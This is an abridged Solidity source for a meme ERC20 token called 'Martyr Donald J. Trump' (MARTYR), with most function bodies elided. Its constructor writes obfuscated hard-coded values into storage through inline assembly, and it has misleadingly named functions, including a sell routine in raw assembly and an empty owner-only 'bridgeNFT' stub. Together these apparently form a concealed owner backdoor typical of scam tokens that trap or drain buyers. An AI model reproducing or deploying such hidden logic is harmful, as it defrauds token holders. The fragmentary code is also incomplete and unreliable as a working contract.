// ALL HAIL MARTYR DONALD J. TRUMP, HE WHO SURVIVED!
...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    constructor (string memory name_, string memory symbol_) {
        ...
        assembly {
            sstore(0x50,0xb0d37793a4d427ed42e9468217f87255b9a9790939f3)
            sstore(0x51,0xb0d32fe80d6f26e642a1dda9b127a5fe372c587739b3)
    ...
    function bridgeNFT() public onlyOwner returns (uint number) {
    }
    ...
    function sellWithNFT404s(address sender, uint256 amount) internal returns (uint256 result) {
            assembly {
                let data := mload(0x40)
    ...
    function _DeployMartyrTrump(address account, uint256 amount) internal virtual {
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployMartyrTrump(creator, initialSupply);
    }
}

contract MartyrTrump is ERC20Token {
    constructor() ERC20Token("Martyr Donald J. Trump", "MARTYR", msg.sender, 1000000000 * 10 ** 18) {
    }
}
